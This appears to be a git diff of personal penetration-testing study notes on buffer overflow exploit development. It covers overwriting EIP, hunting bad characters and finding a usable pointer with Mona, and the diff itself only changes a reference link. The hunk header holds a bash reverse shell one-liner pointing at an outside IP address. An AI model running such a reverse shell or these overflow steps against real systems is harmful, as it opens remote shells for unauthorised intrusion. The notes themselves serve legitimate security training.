@@ -535,7 +535,8 @@ bash -i >& /dev/tcp/10.17.27.169/7778 0>&1
 - we can send the buffer “A”*<offset value> + “B”*4  = the EIP should be 42424242
 - grab badchars chars
 - add to your script and u should follow the ESP dump to find the badchars
-- or > Using Mona (check how to use Mona from PEH here > https://johnermac.github.io/certs/pnpt/peh/#exploit-development-using-python3-and-mona)
+- or > Using Mona # check how to use Mona from PEH here 
+# https://johnermac.github.io/notes/pnpt/peh/#exploit-development-using-python3-and-mona)
 - take off the badchars of the script
 - u should find the pointer with no protections
 - invert the pointer
